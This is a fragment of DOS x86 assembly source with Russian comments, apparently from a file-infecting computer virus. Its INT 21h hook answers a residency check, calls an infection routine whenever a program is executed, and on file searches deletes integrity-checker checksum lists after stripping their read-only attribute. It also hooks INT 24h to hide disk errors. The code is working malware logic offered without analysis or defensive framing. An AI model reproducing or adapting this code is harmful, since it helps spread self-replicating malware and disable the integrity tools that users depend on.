;
;	Собственный обработчик int 21. Надеюсь, все и так понятно.
;
New_21:
	cmp ax,1E02h		; А что вы тут ?
	jz @Int21_Im
	cmp ah,04Bh
	jz @Int21_Run
	cmp ah,4Eh
	jz @DeleteCHK
;	call CheckAdinf
go_21:
	byte 0EAh
Old_21	dword 0

Old21:
	pushf
	call dword ptr cs:Old_21
	retn

@Int21_Im:
	xchg ah,al		; Да чтобы вот.
	mov bx,0106h		; версия
	iret

@Int21_Run:
	call Infect_Thiz	; Ага! щас мы тут заразим кого-то !!!
	jmp short go_21

@DeleteCHK:
	pusha
	push ds
	push es
	call Remove_Guard	; Заткнись
	call ChangeInt24
	push cs
	pop ds
	call ChangeDTA
	mov dx,offset CHKLIST_1
	call @DeleteFile
	mov dx,offset CHKLIST_2
	call @DeleteFile
	call restoreDTA
	call RestoreInt24
	call Restore_Guard	; живи
	pop es
	pop ds
	popa
	jmp go_21

@DeleteFile:
	mov ax,4301h		; Read Only не поможет
	xor cx,cx
	@CallInt21
	mov ah,41h		; хиракири
	@CallInt21
	retn

ChangeDTA:
	mov ah,2Fh
	@CallInt21
	mov old_dta,bx
	mov word ptr old_dta+2,es
	lea dx,new_dta
	mov ah,1ah
	@CallInt21
	retn

RestoreDTA:
	mov dx,cs:old_dta
	mov ds,word ptr cs:old_dta+2
	mov ah,1ah
	@CallInt21
	retn
	
ChangeInt3:
	mov di,offset Old_03
	mov bx,3h*4
	mov dx,offset New_03
	jmp ChangeInt
ChangeInt24:
	mov di,offset Old_24
	mov bx,24h*4
	mov dx,offset New_24
;
;  Перенастройка прерывания:	BX - адрес в таблице
;				DI - адрес сохранения
;				DX - смещение обработчика
;
ChangeInt:
	mov ax,cs
	shl eax,16
	mov ds,ax
	mov ax,dx
	xchg eax,ds:[bx]
	mov cs:[di],eax
	retn
		
New_24:	mov al,3
	iret

RestoreInt3:			; восстановим Int 3
	mov di,offset Old_03
	mov bx,3h*4
	jmp RestoreInt
RestoreInt24:			; восстановим Int 24
	mov di,offset Old_24
	mov bx,24h*4
;
;  Восстановление прерывания:	BX - адрес в таблице
;				DI - адрес сохранения
;
RestoreInt:
	push 0
	pop ds
	mov eax,cs:[di]
	mov ds:[bx],eax
	retn
